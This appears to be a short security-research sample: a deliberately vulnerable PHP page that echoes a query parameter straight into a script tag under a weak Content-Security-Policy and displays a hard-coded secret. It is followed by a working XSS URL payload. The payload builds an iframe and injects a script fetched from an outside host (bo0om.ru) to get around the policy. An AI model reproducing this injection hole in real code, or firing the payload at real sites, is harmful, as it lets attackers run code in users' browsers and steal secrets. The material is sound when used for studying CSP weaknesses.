<?php
header("Content-Security-Policy: default-src 'self' 'unsafe-inline';");
$x=$_GET['x'];

?>

<html>
<head><link rel="stylesheet" href="/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u"><link rel="stylesheet" href="/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp"></head>
<body>
<div class="center-block">
<h1>Hello!</h1>
<?php echo "<script>".$x."</script>";?>
<code id='secret'>Secret: tLtIK1fSp6CJUqZk</code></div>
</body>
</html>


http://hsts.pro/csp.php?xss=f=document.createElement%28%22iframe%22%29;f.id=%22pwn%22;f.src=%22/robots.txt%22;f.onload=%28%29=%3E%7Bx=document.createElement%28%27script%27%29;x.src=%27//bo0om.ru/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;
